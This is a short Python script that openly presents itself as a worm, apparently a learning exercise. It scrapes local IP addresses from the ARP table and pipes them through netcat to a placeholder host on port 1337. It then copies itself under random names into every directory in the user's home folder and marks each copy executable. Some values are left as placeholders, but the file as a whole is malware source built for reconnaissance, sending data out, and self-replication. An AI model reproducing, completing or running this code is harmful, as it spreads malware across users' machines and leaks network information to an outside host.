'''
Our code -> Wooooooooooooooooooooooooooooorm <- Your machine
'''
import subprocess
import re
from os import path, system, walk
from shutil import copyfile
from getpass import getuser
from random import random

def worm_spread():

    target_ips=[]
    
    subprocess.call("arp -a > stored_arp.txt", shell=True)
    arp_list = open("stored_arp.txt", "r")
    arp_list = arp_list.read()

    #arp_list = subprocess.check_output(["arp", "-a"])

    pattern = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'   
    
    ips = re.findall(pattern, arp_list)

    unwanted_ips = insert_unwanted_here

    for i in ips:
        if i not in unwanted_ips:
            target_ips.append(i)
    return target_ips


def nc_listener():
    
    listen_var="echo " + str(worm_spread()) + " | nc host_ip_here 1337"

    subprocess.call(listen_var, shell=True)


def get_file_info():

    #get the name of the current iteration of the worm
    filename = path.basename(__file__)

    #find the current location of the worm file
    location = path.abspath(filename)

    #get the username of Linux user to know the home folder location
    user = getuser()

    return filename, location, user

def replicate(filename, location, user, name):

    #generate random string to differentiate files while testing
    noise = str(random())

    #set destination to the user's Documents folder
    destination = "/home/"+user+"/"+name+"/"+noise+".py"

    #Copies our file into the new location
    copyfile(location,destination)
    
    print("The worm has been copied.")
    return destination

def make_executable(destination):

    #sets a command to make a file executable   
    cmd = "chmod +x" + " " + destination

    #run the command
    system(cmd)
    

def main():
    nc_listener()
    filename, location, user = get_file_info()
    for root, dirs, files in walk("/home/"+user+"/"):
            for name in dirs:
                try:
                    destination = replicate(filename, location, user, name)
                    make_executable(destination)
                    print(destination)
                except:
                    continue


if __name__ == "__main__":
    main()
